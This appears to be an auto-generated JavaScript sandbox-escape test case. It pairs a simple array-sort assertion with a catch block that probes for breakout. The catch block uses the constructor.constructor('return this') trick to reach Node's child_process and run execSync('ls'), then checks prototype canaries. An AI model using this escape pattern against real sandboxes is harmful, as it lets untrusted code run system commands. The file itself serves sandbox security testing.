try {
    const array = [
        {
            name: 'A',
            rating: 2
        },
        {
            name: 'B',
            rating: 3
        },
        {
            name: 'C',
            rating: 2
        },
        {
            name: 'D',
            rating: 4
        },
        {
            name: 'E',
            rating: 3
        },
        {
            name: 'F',
            rating: 3
        },
        {
            name: 'G',
            rating: 4
        },
        {
            name: 'H',
            rating: 3
        },
        {
            name: 'I',
            rating: 2
        },
        {
            name: 'J',
            rating: 2
        },
        {
            name: 'K',
            rating: 2
        }
    ];
    assert.sameValue(array.length, 11);
    array.sort((a, b) => b.rating - a.rating);
    const reduced = array.reduce((acc, element) => acc + element.name, '');
    assert.sameValue(reduced, 'DGBEFHACIJK');
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}